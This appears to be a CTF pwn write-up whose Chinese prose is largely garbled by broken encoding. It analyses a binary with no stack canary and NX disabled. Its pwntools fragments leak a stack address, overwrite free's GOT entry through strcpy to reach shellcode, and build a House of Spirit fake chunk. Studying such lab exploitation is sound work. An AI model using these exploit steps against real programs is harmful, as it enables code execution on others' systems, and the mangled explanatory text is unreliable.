# ����
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE
```
���ֱ�����û��

#��������

## 1.����name
```
for(int i=0;i<=47;i++)
    read(0,name,1);
```
�������ʱ��ջ��<br>
----------------
i
----------------
ret_val
----------------
name_str
----------------
rbp
----------------
�����name_str���� ���ܹ���printf��ʱ���ӡ��ջ�ڱ��ֵ�ebp Ȼ���������ʹ�õ�ջ��ַ<br>
## 2.����id 
```
for(int i=0;i<=3;i++)
    read(0, buf_tmp, 1);
```
��������0-9 �����ת��Ϊ����<br>
## 3."give me money~"
```
read(0,buf,0x40);
strcpy (buf_mal, buf);
```
buf_mal��malloc�����(Ԥ���Ƕ����)<br>
Ȼ����ȫ��ָ��(ptr)��ָ������ռ�<br>
������էһ������ûʲô����<br>
��ϸһ��ͷ�����ջ��������Ը���buf_mal��ַ
```
buf= byte ptr -40h
dest= qword ptr -8
```
����ֱ�ӰѶѵĵ�ַ���ǳ�got��free�ĵ�ַ<br>
Ȼ��strcpy��ʱ���free�ĵ�ַ�ĳ�shellcode�ĵ�ַ

## 4.��֧ѡ��

### choice 1:
������0<x<0x80��Χ<br>
ptr = malloc(0x80)<br>
ptr ָ�������money<br>
������Կ���֮ǰ����Ŀռ�û���ͷ�<br>
���Ȼ�����֮ǰ���������<br>
### choice 2:
test ptr�ǲ���0<br>
0 : ֱ�����"havn't check in"Ȼ�󷵻�<br>
1 : �ͷ�ptr<br>

### choice 3:
ֱ�ӷ���<br>
### ����
��ʾ���Ϸ�<br>

# ͻ�Ƶ�
��choice1 �� choice2����<br>
��ʼptr����0x40�Ŀռ�<br>

## ����

## 1.��������strcpy�޸�got����free�ĵ�ַ��shellcode��ַ
Ȼ��free
```
# �ؼ�1
shellcode + 'A'*(0x30-len(shellcode))
# �ؼ�2
payload = p64(stack_addr) + 'A'*0x30 + p64(free_got)
# ���
p.recvuntil('choice : ')
p.send('2\n')
```
��һ������й¶��ջ��ebp��ֵ Ȼ�����name_str�ĵ�ַ<br>
�ڶ������ǰ�chunk��ַ���ǳ�got���free��ַ Ȼ������strcpy�������ַ���ǳɸոջ��name_str��ַ(���shellcode��) Ȼ�����free<br>

## 2.THE HOUSE OF SPIRIT
studying
��Ҫ������ʵ�mem<br>
```
p.recvuntil('money~')
fake_chunk = 'A'*0x8
fake_chunk += p64(0x61)
fake_chunk += 'A'*0x28
fake_chunk += p64(stack_addr)
p.send(fake_chunk)
```
����stack_addr�������˸ոպ���0x61�ĺ����λ�ã�����0x61����Ϊ���mem��size��<br>
����next_size ����֮ǰҪ������id �������idֵ�����ڱ�stack_addrָ���λ�øߵĵط�������0x61���Ǹ������ȷ����(0x60+1 1�Ǳ�־λ)<br>
***next_size��Լ������***
```
if(chunk_at_offset(p, size)->size <= 2*SIZE_SZ || \
_builtin_expect(chunksize)(chunk_at_offset(p,size) >= av->system_mem,0))
{
    errstr = "free(): invalid next size fast";
    goto errout;
}
```
2*SIZE_SZ < next_size < system_max_mem
```
p.recvuntil('id ~~?')
p.sendline(str(0x20))
```
��������֮�����free�ͻ��øոչ����mem����fastbin��<br>
Ȼ�����malloc���ְѸոյ�mem��chunk�ĵ�ַ���ظ����ǣ����÷��ص�ֵ��Ȼ�󸲸ǵ�ĳ��rsp���������ѭ��������ִ��shell�ˡ�<br>

# Tips
1. �ڴ�й©
2. �ѵ�ַ����
3. ջƫ�ƹ̶�
4. �����������ɿص�λ����Ϊsize+8��next_size����house of spirit

